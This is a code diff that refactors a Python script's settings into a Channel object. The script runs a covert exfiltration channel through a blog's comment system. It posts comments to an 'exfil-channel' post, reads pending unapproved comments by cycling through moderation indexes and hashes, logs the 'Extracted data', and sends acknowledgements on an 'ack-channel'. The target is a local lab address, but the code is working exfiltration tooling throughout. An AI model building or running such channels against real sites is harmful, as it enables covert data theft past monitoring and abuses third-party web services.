@@ -8,11 +8,12 @@ import datetime
 
 random.seed(int(datetime.datetime.now().timestamp()) + int(sys.argv[1]))
 
-target_blog = "http://127.0.0.3/"
-exfil_channel_id = 5
-ack_channel_id = 7
-exfil_channel = "2021/08/13/exfil-channel/"
-ack_channel = "2021/08/13/ack-channel/"
+channel = Channel()
+channel.target_blog = "http://127.0.0.3/"
+channel.exfil_channel = "2021/08/13/exfil-channel/"
+channel.exfil_channel_id = 5
+channel.ack_channel = "2021/08/13/ack-channel/"
+channel.ack_channel_id = 7
 
 recv_time_slot = 10
 process_time_slot = 20
@@ -46,19 +47,19 @@ def fetch_comments_page(comments_url):
     curl_output = subprocess.check_output(fetch_comments_command, shell=True)
     return curl_output.decode()
 
-def get_current_unapproved_index():
+def get_current_unapproved_index(channel):
     global comment_index
 
     random_string = generate_random_string(10)
     comment_to_send = random_string + ": get_current_unapproved_index (" + str(comment_index) + ") "
-    response = submit_comment(target_blog, exfil_channel_id, comment_to_send)
+    response = submit_comment(channel.target_blog, channel.exfil_channel_id, comment_to_send)
     comment_index += 1
 
     return response.unapproved_index
 
-def get_moderation_hash_at_current_time():
+def get_moderation_hash_at_current_time(channel):
     random_string = generate_random_string(10)
-    response = submit_comment(target_blog, exfil_channel_id, random_string + ": Getting_moderation_hash")
+    response = submit_comment(channel.target_blog, channel.exfil_channel_id, random_string + ": Getting_moderation_hash")
 
     return response.moderation_hash, response.unapproved_index
 
@@ -70,16 +71,16 @@ for i in range(1, 4):
     print("## Created client with id: " + str(client.id))
 
 if prev_unapproved_index == 0:
-    prev_unapproved_index = get_current_unapproved_index()
+    prev_unapproved_index = get_current_unapproved_index(channel)
 
-def receive_data(num_of_receivers, recv_time_slot, process_time_slot):
+def receive_data(channel, num_of_receivers, recv_time_slot, process_time_slot):
     global prev_unapproved_index
 
     received_data = []
     
     print("[INFO] Delaying to client timeslot. " + str(recv_time_slot))
     delay_to_timeslot(recv_time_slot)
-    current_hash, server_index = get_moderation_hash_at_current_time()
+    current_hash, server_index = get_moderation_hash_at_current_time(channel)
 
     print("[INFO] Current hash is: " + current_hash)
     print("[INFO] Delaying to server timeslot. " + str(process_time_slot))
@@ -102,7 +103,7 @@ def receive_data(num_of_receivers, recv_time_slot, process_time_slot):
             if current_unapproved_index in processed_unapproved_indexes:
                 continue
             
-            url = target_blog + exfil_channel + "?unapproved=" + str(current_unapproved_index) + "&moderation-hash=" + current_hash + "&url=" + str(current_unapproved_index)
+            url = channel.target_blog + channel.exfil_channel + "?unapproved=" + str(current_unapproved_index) + "&moderation-hash=" + current_hash + "&url=" + str(current_unapproved_index)
             print("[INFO] Checking URL: " + url);
 
             response_html = fetch_comments_page(url)
@@ -123,13 +124,13 @@ def receive_data(num_of_receivers, recv_time_slot, process_time_slot):
                 print("[INFO] No comment for moderation for " + str(recv_time_slot) + " using index " + str(current_unapproved_index) + ". Skipping...")
             index_client += 1
 
-    prev_unapproved_index = get_current_unapproved_index()
+    prev_unapproved_index = get_current_unapproved_index(channel)
 
     return received_data
     
 loop_counter = 99
 while(loop_counter > 0):
-    received_data = receive_data(len(clients), recv_time_slot, process_time_slot)
+    received_data = receive_data(channel, len(clients), recv_time_slot, process_time_slot)
     for exfil_content in received_data:
         to_write = str(datetime.datetime.utcnow()) + ": "
         to_write += "Extracted data with timeslot of " + str(recv_time_slot) + ": " + exfil_content + "\n"
@@ -140,6 +141,6 @@ while(loop_counter > 0):
         
         message_id = exfil_content.split(":")[0]
         print("[INFO] Extracted message_id is " + message_id)
-        submit_comment(target_blog, ack_channel_id, message_id)
+        submit_comment(channel.target_blog, channel.ack_channel_id, message_id)
 
     loop_counter -= 1
